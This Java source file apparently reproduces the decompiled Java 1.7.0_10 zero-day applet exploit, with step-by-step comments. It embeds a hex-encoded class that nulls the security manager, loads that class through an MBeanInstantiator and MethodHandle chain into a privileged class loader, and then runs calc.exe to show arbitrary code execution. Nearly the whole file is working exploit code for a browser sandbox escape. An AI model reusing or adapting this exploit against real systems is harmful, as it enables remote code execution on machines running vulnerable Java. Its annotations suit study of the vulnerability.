package evercookie;

/*
 Java 0day 1.7.0_10 decrypted source
 Originaly placed on https://damagelab.org/index.php?showtopic=23719&st=0
 From Russia with love.
 */
import java.applet.Applet;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;

import com.sun.jmx.mbeanserver.JmxMBeanServer;
import com.sun.jmx.mbeanserver.JmxMBeanServerBuilder;
import com.sun.jmx.mbeanserver.MBeanInstantiator;

class ZeroDayApplet extends Applet {

	private static final long serialVersionUID = 1L;

	public static byte[] hex2Byte(String paramString) {
		byte[] arrayOfByte = new byte[paramString.length() / 2];
		for (int i = 0; i < arrayOfByte.length; i++) {
			arrayOfByte[i] = (byte) Integer.parseInt(paramString.substring(2 * i, 2 * i + 2), 16);
		}
		return arrayOfByte;
	}

	// Decompiles to:
	/*
	 * import java.security.AccessController; import
	 * java.security.PrivilegedExceptionAction;
	 * 
	 * public class B implements PrivilegedExceptionAction { public B() { try {
	 * AccessController.doPrivileged(this); } catch(Exception e) { } }
	 * 
	 * public Object run() { System.setSecurityManager(null); return new
	 * Object(); } } // This basically removes the security manager
	 * (System.setSecurityManager(null)), allowing arbitrary code execution.
	 */
	// Decompilation credit to benmmurphy
	// http://www.reddit.com/r/netsec/comments/16b4n1/0day_exploit_fo_java_17u10_spotted_in_the_wild/c7ulpd7
	public static String ByteArrayWithSecOff = "CAFEBABE0000003200270A000500180A0019001A07001B0A001C001D07001E07001F0700200100063C696E69743E010003282956010004436F646501000F4C696E654E756D6265725461626C650100124C6F63616C5661726961626C655461626C65010001650100154C6A6176612F6C616E672F457863657074696F6E3B010004746869730100034C423B01000D537461636B4D61705461626C6507001F07001B01000372756E01001428294C6A6176612F6C616E672F4F626A6563743B01000A536F7572636546696C65010006422E6A6176610C000800090700210C002200230100136A6176612F6C616E672F457863657074696F6E0700240C002500260100106A6176612F6C616E672F4F626A656374010001420100276A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E01001E6A6176612F73656375726974792F416363657373436F6E74726F6C6C657201000C646F50726976696C6567656401003D284C6A6176612F73656375726974792F50726976696C65676564457863657074696F6E416374696F6E3B294C6A6176612F6C616E672F4F626A6563743B0100106A6176612F6C616E672F53797374656D01001273657453656375726974794D616E6167657201001E284C6A6176612F6C616E672F53656375726974794D616E616765723B295600210006000500010007000000020001000800090001000A0000006C000100020000000E2AB700012AB8000257A700044CB1000100040009000C00030003000B000000120004000000080004000B0009000C000D000D000C000000160002000D0000000D000E00010000000E000F001000000011000000100002FF000C00010700120001070013000001001400150001000A0000003A000200010000000C01B80004BB000559B70001B000000002000B0000000A00020000001000040011000C0000000C00010000000C000F0010000000010016000000020017";

	@SuppressWarnings("rawtypes")
	@Override
	public void init() {
		try {
			// Convert above hex string to byte array.
			byte[] arrayOfByte = hex2Byte(ByteArrayWithSecOff);

			// MBean creator to load the sun. classes
			JmxMBeanServerBuilder localJmxMBeanServerBuilder = new JmxMBeanServerBuilder();
			JmxMBeanServer localJmxMBeanServer = (JmxMBeanServer) localJmxMBeanServerBuilder.newMBeanServer("", null,
					null);
			MBeanInstantiator localMBeanInstantiator = localJmxMBeanServer.getMBeanInstantiator();

			// Looks like this loads some normally inaccessable libraries.
			// Can't find any good documentation on these two, so I'm not sure
			// what they do.
			ClassLoader a = null;
			Class localClass1 = localMBeanInstantiator.findClass("sun.org.mozilla.javascript.internal.Context", a);
			Class localClass2 = localMBeanInstantiator.findClass(
					"sun.org.mozilla.javascript.internal.GeneratedClassLoader", a);

			// "Returns a lookup object which is trusted minimally.
			// It can only be used to create method handles to publicly
			// accessible fields and methods."
			MethodHandles.Lookup localLookup = MethodHandles.publicLookup();

			// Convienience for MethodType.methodType(MethodHandle.class, new
			// Class[] { Class.class, MethodType.class });
			// Returns the type of a method which takes a Class and a MethodType
			// as input and returns a MethodHandle as output.
			MethodType localMethodType1 = MethodType.methodType(MethodHandle.class, Class.class,
					new Class[] { MethodType.class });

			// "A typed, directly executable reference to an underlying method"
			// Named "findConstructor", Is under the MethodHandles.Lookup class,
			// and has the method type localMethodType1 (as above)
			// Basically a(n in)direct pointer to the findConstructor function
			// in the MethodHandles.Lookup class
			MethodHandle localMethodHandle1 = localLookup.findVirtual(MethodHandles.Lookup.class, "findConstructor",
					localMethodType1);

			// Returns the type of a method which takes no input (void input)
			// and returns no output
			MethodType localMethodType2 = MethodType.methodType(Void.TYPE);

			// Equivalent to localLookup.findConstructor(localClass1,
			// localMethodType2)
			// Basically a(n in)direct pointer to the constructor to the
			// "sun.org.mozilla.javascript.internal.Context" class which has no
			// input
			MethodHandle localMethodHandle2 = (MethodHandle) localMethodHandle1.invokeWithArguments(new Object[] {
					localLookup, localClass1, localMethodType2 });

			// Returns a new object of the type
			// "sun.org.mozilla.javascript.internal.Context" new Object[0]
			// represents no input
			Object localObject1 = localMethodHandle2.invokeWithArguments(new Object[0]);

			// Method type which takes a Class, a String, and a MethodType, and
			// returns a MethodHandle
			MethodType localMethodType3 = MethodType.methodType(MethodHandle.class, Class.class, new Class[] {
					String.class, MethodType.class });

			// Basically a(n in)direct pointer to the findVirtual function in
			// the MethodHandles.Lookup class
			MethodHandle localMethodHandle3 = localLookup.findVirtual(MethodHandles.Lookup.class, "findVirtual",
					localMethodType3);

			// Returns the methodType of something in the
			// "sun.org.mozilla.javascript.internal.GeneratedClassLoader" class
			// which returns a ClassLoader
			MethodType localMethodType4 = MethodType.methodType(localClass2, ClassLoader.class);

			// Equivalent to localLookup.findVirtual(localClass1,
			// "createClassLoader", localMethodType4)
			// Basically a(n in)direct pointer to the function
			// "createClassLoader" in
			// "sun.org.mozilla.javascript.internal.Context"
			MethodHandle localMethodHandle4 = (MethodHandle) localMethodHandle3.invokeWithArguments(new Object[] {
					localLookup, localClass1, "createClassLoader", localMethodType4 });

			// Equivalent to localObject1.createClassLoader(null)
			Object localObject2 = localMethodHandle4.invokeWithArguments(new Object[] { localObject1, null });

			// Equivalent to localLookup.findVirtual(localClass2, "defineClass",
			// localMethodType5)
			// Basically a(n in)direct pointer to the function "defineClass" in
			// "sun.org.mozilla.javascript.internal.GeneratedClassLoader"
			MethodType localMethodType5 = MethodType
					.methodType(Class.class, String.class, new Class[] { byte[].class });
			MethodHandle localMethodHandle5 = (MethodHandle) localMethodHandle3.invokeWithArguments(new Object[] {
					localLookup, localClass2, "defineClass", localMethodType5 });

			// Equivalent to localObject2.defineClass(null, arrayOfByte);
			Class localClass3 = (Class) localMethodHandle5.invokeWithArguments(new Object[] { localObject2, null,
					arrayOfByte });

			// Creates a newInstance of localClass3.
			// localClass3 represents the decompiled code of arrayOfByte, which
			// executes a class which removes the security manager
			localClass3.newInstance();

			// Now you can execute arbitrary code
			Runtime.getRuntime().exec("calc.exe");

		} catch (Throwable ex) {
			// Breaking out of the sandbox failed.
		}
	}
}